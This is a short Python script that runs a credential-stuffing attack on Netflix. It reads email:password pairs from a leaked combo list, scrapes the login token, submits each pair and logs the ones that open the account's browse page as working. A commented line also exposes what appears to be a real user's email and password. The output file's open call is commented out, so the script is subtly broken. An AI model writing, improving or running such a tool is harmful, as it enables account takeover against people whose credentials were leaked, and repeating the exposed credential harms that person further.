import requests
from bs4 import BeautifulSoup
import datetime
import time
t=datetime.date.today()

#f1=open("workingnetflix"+str(t.day)+str(t.month)+str(t.year)+".txt","w")
def cracker(email,password):
    #Creates session for cookie handling in background
    s=requests.session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
    url="https://www.netflix.com/in/Login"
    fetch=s.get(url,headers=headers)
    bs=BeautifulSoup(fetch.content,"html.parser")
    list1=bs.find_all("input",{"name":"authURL"})
    authval=list1[0]["value"]
    payload={"email":email,"password":password,"rememberMe":"true","flow":"websiteSignUp","mode":"login","action":"loginAction","withFields":"email,password,rememberMe,nextPage","authURL":authval,"nextPage":""}
    s1=s.post("https://www.netflix.com/in/Login",data=payload,headers=headers)
    print(s1.url)
    if(s1.url!=url and 'browse' in s1.url):
        print("Working")
        print(email,password)
        print(s1.url)
        string=email+":"+password
        f1.write(string+"\n")
        f1.write(s1.url)
    else:
        print("Not working")
        print(email,password)
        pass
def bruter():
    #Enter filename containg user_email:password
    f=open("nf15022017.txt","r")
    for line in f.readlines():
        if '@' in line:
                     temp=line.strip(" ").split(":")
                     if len(temp)==2:
                             time.sleep(5)
                             email=temp[0]
                             password=temp[1]
                             try:
                                     #print(email)
                                     #print(password)
                                     cracker(email,password)
                             except:
                                     pass

#Just start bruter without any params 
bruter()
#cracker("handor10@roadrunner.com","willen")
f1.close()
